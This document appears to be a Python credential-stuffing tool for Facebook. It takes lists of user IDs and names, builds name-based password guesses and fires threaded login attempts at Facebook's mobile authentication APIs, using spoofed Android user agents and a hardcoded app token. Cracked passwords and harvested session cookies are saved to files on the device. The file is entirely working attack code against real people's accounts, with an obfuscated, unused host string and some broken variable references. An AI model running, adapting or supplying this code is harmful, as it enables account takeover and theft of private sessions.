import os,json,time,uuid,sys,random,base64,shutil,re, requests,mechanize
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import brute
line="—"*30
limit=50
symbols="\\"
os.system("clear")
logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻ Parvez"""


twof = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'.lower()


os.system("git pull")





def main():
    os.system("clear")
    print(logo)
    print(line)
    print(" [1] File Clone")
    print(" [2] Brute \n\n")
    option=input(" [✓] -> ")
    if option in ["1"]:
        file_clone()
    elif option in ["2"]:
        brute_main()
    else:
        main()
    



def file_clone():
    pwx=[]
    os.system("clear")
    print(logo)
    print(line)
    try:
        print(" Example /sdcard/id.txt")
        user=open(input("  Π File Path >> "),"r").read().splitlines()
        print(line)
    except Exception as e:
        main()
    limit=len(user)
    print(line)
    try:
        lim=int(input(" How many password You Want to add : "))
    except:
        lim=15
    print(line)
    for _ in range(lim):
        ty=input(" Add Password: ")
        pwx.append(ty)
        print(line)
    with ThreadPool(max_workers=30) as heron:
        print(" [1] METHOD")
        print(" [2] METHOD")
        print(" [3] METHOD")
        print(line)
        method=input(" [✓] -> ")
        
        os.system("clear")
        print(logo)
        print(line)
        print(" Total Id "+str(limit)+"| Pas "+str(len(pwx)))
        print(line)
        
        for xd in user:
            uid,names=xd.split("|")
            if method in ["1"]:
                heron.submit(test_1,uid,names,pwx)
            elif method in ["3"]:
                heron.submit(test_3,uid,names,pwx)
            else:
                heron.submit(test_2,uid,names,pwx)
                


def brute_main():
    pwx=[]
    user=[]
    os.system("clear")
    print(logo)
    print(line)
    try:
        print(" Example /sdcard/id.txt")
        importfile=open(input("  Π File Path >> "),"r").read().splitlines()
        print(line)
        brute.Brute(user,importfile)
    except Exception as e:
        main()
    limit=len(user)
    print(line)
    try:
        lim=int(input(" How many password You Want to add : "))
    except:
        lim=15
    print(line)
    for _ in range(lim):
        ty=input(" Add Password: ")
        pwx.append(ty)
        print(line)
    with ThreadPool(max_workers=30) as heron:
        print(" [1] METHOD")
        print(" [2] METHOD")
        print(" [3] METHOD")
        print(line)
        method=input(" [✓] -> ")
        
        os.system("clear")
        print(logo)
        print(line)
        print(" Total Id "+str(limit)+"| Pas "+str(len(pwx)))
        print(line)
        
        for xd in user:
            uid,names=xd.split("|")
            if method in ["1"]:
                heron.submit(test_1,uid,names,pwx)
            elif method in ["3"]:
                heron.submit(test_3,uid,names,pwx)
            else:
                heron.submit(test_2,uid,names,pwx)


loop=0
oks=[]
cps=[]
profitoks=[]
webHost='jrhr'+'jrud'+'hrgg'+'wje'+'jhe'+'vev'+'rvjr'+'bv.'+'on'+'re'+'nd'+'er'

modelsXX=str(requests.get("https://raw.githubusercontent.com/TEAM-ELITE1/database/refs/heads/main/model.txt").text).splitlines()


def uza1():
    dalvik=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4,13))}; {str(random.choice(modelsXX))} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '
    return dalvik+"[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    




def uza2():
    dalvik=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4,13))}; {str(random.choice(modelsXX))} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '
    return dalvik+"[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    
    



def uza3():
    dalvik=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4,13))}; {str(random.choice(modelsXX))} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '
    return dalvik+"[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    
    

def test_1(uid,names,pwx):
    global loop,oks,limit
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-M1\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': uza1(),
            'Host':'graph.facebook.com',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000,40000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url="https://graph.facebook.com/auth/login"
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                         print(f"\r\r [OK] {xd} | {ps}| {coki}")
                         oks.append(xd)
                         open("/sdcard/test-ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                break
            elif twof in str(rq).lower():
                print(f"\r\r [2F] {uid} | {ps}")
                open("/sdcard/test-2f.txt","a").write(uid+"|"+ps+"\n")
                break
            elif "user must verify" in str(rq).lower():
                cps.append(uid)
                xd=str(rq['error']['error_data']['uid'])
                print(f"\r\r [CP] {xd} | {ps}")
                open("/sdcard/test-CP.txt","a").write(xd+"|"+ps+"\n")
                break
                
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)



def test_2(uid,names,pwx):
    global loop,oks,limit
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-M2\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid, 
            'password': "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate'}
            head = {
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': uza2(),
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger',}
            rq = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head).json()
            if "session_key" in rq:
                xd=str(rq["uid"])
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                         print(f"\r\r [OK] {xd} | {ps}| {coki}")
                         oks.append(xd)
                         open("/sdcard/test-ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                break
                
            elif twof in str(rq).lower():
                print(f"\r\r [2F] {uid} | {ps}")
                open("/sdcard/test-2f.txt","a").write(uid+"|"+ps+"\n")
                break
            
            elif "user must verify" in str(rq).lower():
                cps.append(uid)
                xd=str(rq['error']['error_data']['uid'])
                print(f"\r\r [CP] {xd} | {ps}")
                open("/sdcard/test-CP.txt","a").write(xd+"|"+ps+"\n")
                break
                
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        


def test_3(uid,names,pwx):
    global loop,oks,limit
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE-M3\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            edata={
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "en_US",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": "11994080425506443985518532446",
                "variables": "{\"params\": " + json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "sim_phones": [],
                            "secure_family_device_id": str(uuid.uuid4()),
                            "attestation_result": {
                                "data": "eyJjaGFsbGVuZ2Vfbm9uY2UiOiAiWHpONmM5eEE0MmNjMW5mdmFIRk1pQTdzOXFDQzhYd0hLSmZPSnJDWWNrND0iLCAidXNlcm5hbWUiOiAiMTAwMDAyNTY2NjIxNDA5In0=",
                                "signature": "MEUCIQDr7WcJxItusy+bdqDKLyObaZrxduabPGIuNjCyRy1MAwIgbpu6PlPS+frCp+VMlwNcd/YAaExWpQ70GVIU6GBr7Cw=",
                                "keyHash": "c9f1ad106abc6f55de332e615e9895b7d501a5c65bd63b3d697d2521607faad4"
                            },
                            "has_granted_read_contacts_permissions": 0,
                            "auth_secure_device_id": "",
                            "has_whatsapp_installed": 0,
                            "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
                            "sso_token_map_json_string": "",
                            "event_flow": "login_manual",
                            "password_contains_non_ascii": "false",
                            "sim_serials": [],
                            "client_known_key_hash": "",
                            "encrypted_msisdn": "",
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "null",
                            "should_show_nested_nta_from_aymh": 0,
                            "device_id": str(uuid.uuid4()),
                            "login_attempt_count": 1,
                            "machine_id": "",
                            "flash_call_permission_status": {
                                "READ_PHONE_STATE": "DENIED",
                                "READ_CALL_LOG": "DENIED",
                                "ANSWER_PHONE_CALLS": "DENIED"},
                            "accounts_list": [],
                            "family_device_id": str(uuid.uuid4()),
                            "fb_ig_device_id": [],
                            "device_emails": [],
                            "try_num": 1,
                            "lois_settings": {"lois_token": ""},
                            "event_step": "home_page",
                            "headers_infra_flow_id": str(uuid.uuid4()),
                            "openid_tokens": {},
                            "contact_point": uid},
                        "server_params": {
                            "should_trigger_override_login_2fa_action": 0,
                            "is_from_logged_out": 0,
                            "should_trigger_override_login_success_action": 0,
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "waterfall_id": str(uuid.uuid4()),
                            "login_source": "Login",
                            "is_platform_login": 0,
                            "pw_encryption_try_count": 1,
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "is_from_landing_page": 0,
                            "password_text_input_id": "2l8w01:99",
                            "is_from_empty_password": 0,
                            "is_from_msplit_fallback": 0,
                            "ar_event_source": "login_home_page",
                            "username_text_input_id": "2l8w01:98",
                            "layered_homepage_experiment_group": 'null',
                            "device_id": str(uuid.uuid4()),
                            "INTERNAL__latency_qpl_instance_id": 15661900900760.0,
                            "reg_flow_source": "login_home_native_integration_point",
                            "is_caa_perf_enabled": 1,
                            "credential_type": "password",
                            "is_from_password_entry_page": 0,
                            "caller": "gslr",
                            "family_device_id": str(uuid.uuid4()),
                            "is_from_assistive_id": 0,
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    }),
                    "bloks_versioning_id": "6e5066c89e362918fb2dee96006e79b5884689c496dc2d8364ce162aa16ee708",
                    "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                }) + "}",
                "fb_api_analytics_tags": "[\"GraphServices\"]",
                "client_trace_id": str(uuid.uuid4()),}
            head={
               "user-agent": uza3(),
                "accept-encoding": "gzip, deflate",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "host": "graph.facebook.com",
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-sim-hni": str(random.randint(20000,40000)),
                "x-fb-net-hni": str(random.randint(20000,40000)),
                "content-type": "application/x-www-form-urlencoded",
                "x-graphql-client-library": "graphservice",
                "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "x-tigon-is-retry": "False",
                "x-fb-privacy-context": "3643298472347298",
                "x-graphql-request-purpose": "fetch",
                "x-fb-device-group": str(random.randint(2000,4000)),
                "x-zero-eh": "664c0faaac849cb891d0a261fbb72a12",
                "x-zero-state": "unknown",
                "x-fb-connection-type": "WIFI",
                "x-fb-rmd": "fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=-994;recvTime=4160",
                "x-fb-request-analytics-tags": "{\"network_tags\":{\"product\":\"350685531728\",\"purpose\":\"fetch\",\"request_category\":\"graphql\",\"retry_attempt\":\"0\"},\"application_tags\":\"graphservice\"}",
                "x-fb-http-engine": "Tigon/Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True",
                "Content-Length": "1966"}
            url='https://graph.facebook.com/graphql'
            rq=str(requests.post(url,data=edata, headers=head).text)
            if "session_key" in rq:
                data_coki=rq.replace(symbolsx,"")
                c_user=re.search('"c_user","value":"(.*?)",', str(data_coki)).group(1)
                xs=re.search('"xs","value":"(.*?)",', str(data_coki)).group(1)
                fr=re.search('"fr","value":"(.*?)",', str(data_coki)).group(1)
                datr=re.search('"datr","value":"(.*?)",', str(data_coki)).group(1)
                coki="c_user="+c_user+";xs="+xs+";fr="+fr+";datr="+datr
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                res = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                if "Photoshop" in res:
                    if xd not in oks:
                         print(f"\r\r [OK] {uid} | {ps}| {coki}")
                         oks.append(xd)
                         open("/sdcard/test-ok.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
                
                
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        
        


main()


